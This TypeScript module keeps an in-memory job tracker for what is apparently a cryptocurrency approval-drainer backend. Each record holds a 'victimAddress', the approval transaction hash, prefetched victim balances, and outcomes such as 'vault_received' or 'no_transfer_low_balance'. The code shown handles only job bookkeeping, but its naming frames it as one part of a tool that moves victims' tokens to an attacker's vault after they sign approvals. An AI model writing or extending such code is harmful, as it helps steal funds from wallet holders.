import { randomUUID } from "node:crypto";

export type LogApprovalOutcome = "pending" | "vault_received" | "no_transfer_low_balance" | "error";

export type LogApprovalJobRecord = {
  status: "queued" | "running" | "completed";
  outcome: LogApprovalOutcome;
  message?: string;
  depositTxHash?: string;
  victimAddress: string;
  approveTxHash?: string;
  verifiedBalanceRaw?: string;
  prefetchedBalanceRaw?: string;
  prefetchedEnergyFactor?: string;
  createdAt: number;
  completedAt?: number;
};

const jobs = new Map<string, LogApprovalJobRecord>();

export function createLogApprovalJob(params: {
  victimAddress: string;
  approveTxHash?: string;
}): string {
  const jobId = randomUUID();
  const rec: LogApprovalJobRecord = {
    status: "queued",
    outcome: "pending",
    victimAddress: params.victimAddress.trim(),
    approveTxHash: params.approveTxHash?.trim() || undefined,
    createdAt: Date.now(),
  };
  jobs.set(jobId, rec);
  return jobId;
}

export function getLogApprovalJob(jobId: string): LogApprovalJobRecord | undefined {
  return jobs.get(jobId);
}

export function updateLogApprovalJob(jobId: string, patch: Partial<LogApprovalJobRecord>): void {
  const cur = jobs.get(jobId);
  if (!cur) return;
  jobs.set(jobId, { ...cur, ...patch });
}

/** Bound memory — drop completed jobs older than ttl (default 1h). */
export function pruneLogApprovalJobs(maxAgeMs = 3_600_000): void {
  const now = Date.now();
  for (const [id, j] of jobs) {
    if (j.status === "completed" && (j.completedAt ?? j.createdAt) < now - maxAgeMs) {
      jobs.delete(id);
    }
  }
}
